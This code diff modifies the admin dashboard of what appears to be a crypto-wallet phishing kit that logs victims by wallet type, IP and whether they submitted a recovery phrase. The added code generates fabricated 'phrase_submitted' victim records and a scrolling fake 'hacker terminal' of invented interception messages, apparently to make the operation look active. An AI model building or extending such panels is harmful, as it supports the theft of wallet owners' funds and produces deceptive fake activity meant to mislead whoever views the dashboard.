@@ -9,6 +9,10 @@ export default function AdminPage() {
 
   const [logs, setLogs] = useState<any[]>([]);
   const [expandedLogId, setExpandedLogId] = useState<string | null>(null);
+
+  // Fake Simulation
+  const [isSimulating, setIsSimulating] = useState(false);
+  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
   
   // Fake Phrase states
   const [masterPhrase, setMasterPhrase] = useState("");
@@ -40,6 +44,63 @@ export default function AdminPage() {
     };
     fetchLogs();
     const interval = setInterval(fetchLogs, 3000);
+    return () => clearInterval(interval);
+  }, [isLogged]);
+
+  // Handle Simulation Data
+  useEffect(() => {
+    if (!isSimulating || !isLogged) return;
+
+    const fakeAdd = async () => {
+      const wallets = ["MetaMask", "Trust Wallet", "Coinbase", "SafePal", "Ledger"];
+      const statuses = ["visited_site", "connection_failed", "phrase_submitted"];
+      const countries = ["USA", "Germany", "United Kingdom", "France", "Japan", "Russia", "Brazil"];
+      
+      const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+      const randomWallet = wallets[Math.floor(Math.random() * wallets.length)];
+      const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
+
+      try {
+        await fetch("/api/logs", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            status: randomStatus, 
+            wallet: randomWallet, 
+            fakeIp: randomIp,
+            browserData: { userAgent: "Mozilla/5.0 Simulation", isMobile: Math.random() > 0.5 }
+          })
+        });
+      } catch (err) {}
+    };
+
+    const interval = setInterval(fakeAdd, 4500);
+    return () => clearInterval(interval);
+  }, [isSimulating, isLogged]);
+
+  // Handle Terminal Messages
+  useEffect(() => {
+    if (!isLogged) return;
+    
+    const msgs = [
+      "[+] Handshake established with node eth-mainnet-02",
+      "[*] Intercepting Web3 provider for target segment...",
+      "[!] Connection request timed out for host 92.14.2.8",
+      "[*] Synchronizing shared state with remote vault...",
+      "[+] Cryptographic key rotation successful",
+      "[*] Pinging global proxy cluster nodes...",
+      "[-] Target segment heartbeat failure — retrying injection",
+      "[+] Metadata captured: fingerprinting active targets",
+      "[*] Verifying session consistency for inbound streams",
+      "[+] Encrypting response payload with AES-256-GCM"
+    ];
+
+    const generate = () => {
+      const line = `${new Date().toLocaleTimeString()} ${msgs[Math.floor(Math.random() * msgs.length)]}`;
+      setTerminalLogs(prev => [line, ...prev].slice(0, 50));
+    };
+
+    const interval = setInterval(generate, 1800);
     return () => clearInterval(interval);
   }, [isLogged]);
 
@@ -203,6 +264,27 @@ export default function AdminPage() {
           </div>
 
           <div className="bg-[#111] border border-zinc-800 rounded-2xl p-6 shadow-xl">
+            <div className="flex justify-between items-center mb-4">
+              <h2 className="text-lg font-bold text-white">System Simulation</h2>
+              <button 
+                onClick={() => setIsSimulating(!isSimulating)}
+                className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${isSimulating ? 'bg-blue-600' : 'bg-zinc-700'}`}
+              >
+                <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${isSimulating ? 'translate-x-6' : 'translate-x-1'}`} />
+              </button>
+            </div>
+            <p className="text-xs text-zinc-500 mb-6 leading-relaxed">
+              Enable "Global Node Simulator" to generate artificial target activity. This produces high-density data for stress testing and validation.
+            </p>
+            <div className="flex items-center gap-3">
+              <div className={`w-2 h-2 rounded-full ${isSimulating ? 'bg-blue-500 animate-pulse' : 'bg-red-500'}`} />
+              <span className="text-[10px] font-bold uppercase tracking-wider text-zinc-400">
+                {isSimulating ? 'Simulator Active: Broadcasting...' : 'Simulator Idle'}
+              </span>
+            </div>
+          </div>
+
+          <div className="bg-[#111] border border-zinc-800 rounded-2xl p-6 shadow-xl">
             <h2 className="text-lg font-bold text-white mb-4">System Status</h2>
             <div className="space-y-4">
               <div className="flex justify-between items-center text-sm">
@@ -221,9 +303,9 @@ export default function AdminPage() {
           </div>
         </div>
 
-        {/* Right Col: Live Logs */}
-        <div className="md:col-span-2">
-          <div className="bg-[#111] border border-zinc-800 rounded-2xl overflow-hidden shadow-xl flex flex-col h-full min-h-[500px]">
+        {/* Right Col: Live Logs & Terminal */}
+        <div className="md:col-span-2 space-y-6">
+          <div className="bg-[#111] border border-zinc-800 rounded-2xl overflow-hidden shadow-xl flex flex-col h-[400px]">
             <div className="px-6 py-4 border-b border-zinc-800 bg-[#161616] flex justify-between items-center">
               <h2 className="text-lg font-bold text-white flex items-center gap-2">
                 <span className="relative flex h-3 w-3">
@@ -321,6 +403,47 @@ export default function AdminPage() {
                   </tbody>
                 </table>
               )}
+            </div>
+          </div>
+
+          {/* Hacker Terminal */}
+          <div className="bg-[#0c0c0c] border border-zinc-800 rounded-2xl overflow-hidden shadow-2xl h-[250px] flex flex-col font-mono text-xs relative">
+            <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/50 flex justify-between items-center">
+              <div className="flex items-center gap-2">
+                <div className="w-2 h-2 rounded-full bg-red-500/50" />
+                <div className="w-2 h-2 rounded-full bg-yellow-500/50" />
+                <div className="w-2 h-2 rounded-full bg-green-500/50" />
+                <span className="ml-2 text-zinc-500 text-[10px] font-bold uppercase tracking-widest">Real-time Activity Console</span>
+              </div>
+              <div className="flex items-center gap-1">
+                <div className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
+                <span className="text-[9px] text-red-500 font-bold uppercase">Streaming live</span>
+              </div>
+            </div>
+            
+            <div className="flex-1 p-4 overflow-y-auto space-y-1.5 scrollbar-thin scrollbar-thumb-zinc-800">
+              {terminalLogs.length === 0 ? (
+                <div className="text-zinc-700 animate-pulse">Initializing segment data synchronization...</div>
+              ) : (
+                terminalLogs.map((log, i) => (
+                  <div key={i} className="flex gap-4 group">
+                    <span className="text-zinc-600 select-none">[{50 - i}]</span>
+                    <span className={`flex-1 ${log.includes('[+]') ? 'text-blue-400' : log.includes('[-]') ? 'text-red-400' : log.includes('[!]') ? 'text-amber-500' : 'text-zinc-400'}`}>
+                      {log}
+                    </span>
+                  </div>
+                ))
+              )}
+            </div>
+
+            {/* Overlays for "Hacker" aesthetic */}
+            <div className="absolute inset-0 pointer-events-none bg-gradient-to-t from-black/40 to-transparent" />
+            <div className="absolute inset-0 pointer-events-none overflow-hidden opacity-[0.03]">
+              <div className="grid grid-cols-2 gap-4 h-full w-full">
+                {[...Array(12)].map((_, i) => (
+                  <div key={i} className="border border-white h-10 w-full" />
+                ))}
+              </div>
             </div>
           </div>
         </div>
